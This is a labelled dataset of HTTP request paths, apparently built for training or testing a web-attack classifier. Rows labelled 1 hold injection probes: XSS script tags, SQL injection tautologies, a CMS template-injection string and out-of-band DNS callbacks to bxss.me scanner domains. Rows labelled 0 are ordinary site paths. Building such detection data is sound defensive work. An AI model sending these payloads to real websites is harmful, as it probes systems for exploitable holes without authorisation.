request	label
"/*/210514-1/index/93'""""()&%<acx><script >rsbr(9629)</script>.css"	1
/**/system/2021/12/11/012229298.shtml	0
/******/ld_kjcx_kjzl02_18.png	0
/***/0/02/10/44/2104427_967680.jpg	0
"/****/˿·?page=1'""()&%<acu><script>9112(9131)</script>"	1
/****/zdgz/2020_zdgz/202110/gjcp/dljx/	0
"/******/download/downfile.jsp?classid=0'""""()&%<acx><script >d3hl(9224)</script>&filename=ad2956b5c62a469ea6bac71f9dae4ee9.doc"	1
/**/admin.php?cont=store_nas	1
"/****/bmkx/"""".gethostbyname(lc(""""hitkd"""".""""plolqpxmecf2e.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(98).chr(65).chr(103).chr(81).""""/201812/t20181208_112298.html"	1
/**/index.php?do=post&id=337&c=dt&a=goods&	1
/***/003/004/456/00300445649_acf99124.jpg	0
/*****/system/2009/08/28/002798751.shtml	0
"/************/template/jcse/110105008056111/16/"""" """"a"""".concat(70-3).concat(22*4).concat(105).concat(77).concat(121).concat(67) (require""""socket""""
socket.gethostbyname(""""hitye"""" """"lpnpnlgbe3f78.bxss.me."""")[3].to_s) """"/jquery.waterfall.js"	1
/****/cydt/18498.htm	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u7c89\u7c89\u4e2d\u97e9\u70eb\u5427	0
/**/index.php?do=post&id=352&c=dt&a=goods&	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6e24\u6d77\u9886\u822a\u5e7f\u544a\u8bbe\u8ba1\u90e8	0
/xinanyanjiu' and 2*3*8=6*8 and 'na8t'='na8t/*************/nongchanpin/2021-01-14/1705.html	1
/***/system/2021/12/16/013495465.shtml	0
/****/2020wzqh/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/xqdt/jtx/201610/t20161025_43698.html	0
"/****/bysw/201907/t20190704_139319.html?leader=' 'a'.concat(70-3).concat(22*4).concat(105).concat(69).concat(122).concat(89) (require'socket'
socket.gethostbyname('hitmx' 'iudvhemhadbed.bxss.me.')[3].to_s) '"	1
/****/xxgknb/2013/bxss.me/t/xss.html?	1
/******/in-morepic.png	0
/*****/tag_test_action.php?partcode={dede:field name='source' runphp='yes'}echo md52086373098&token=&url=a&{/dede:field}=	1
/****/web/search?searchword=1&channelid=287219%') or 7643=8006	1
/****/zxxx/content.html?metadataid=10062419	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u660a\u6850\u5546\u884c	0
/****/1012/vurl	0
/*****/system/2019/06/12/javascript:window.close();	1
/****/web/search?searchword=1') or 1486=1486 and '1'='1&channelid=287219&perpage=24&templet=1&token=1	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6c49\u4e2d\u674e\u5b50\u917f\u76ae\u9ebb\u8fa3\u70eb\u5e97	0
/******/hfjyxz/202107/t20210726_184951.html	0
/**********/system/2020/06/15/013185862.shtml	0
/******/2015qglh/jd/	0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%' and 4078=4078	1
/******/cms/www/201611/171245468w0x.jpg	0
/****/2020wzqh/wzqh_qwjd/202011/t20201130_259587.html' and 'x'='y	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u81f3\u5c0a\u7537\u670d\u88c5\u5e97	0
"/****/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15""><script>alert(777);</script>"	1
/****/czgk/bmyjs/zzqfyxt/ynxrmfy/202002/t20200210_1949305.html	0
/****/web/search?page=4&channelid=222832&searchword=\u673a\u6784\u6539\u9769\u65b9\u6848&keyword=\u673a\u6784\u6539\u9769\u65b9\u6848&perpage=20&outlinepage=10	0
/**********/system/2017/05/18/012314164.shtml	0
/***/0/02/08/88/2088849_619229.jpg	0
/***/resource/js/***/common.js	0
/***/0/02/12/43/2124389_997865.jpg	0
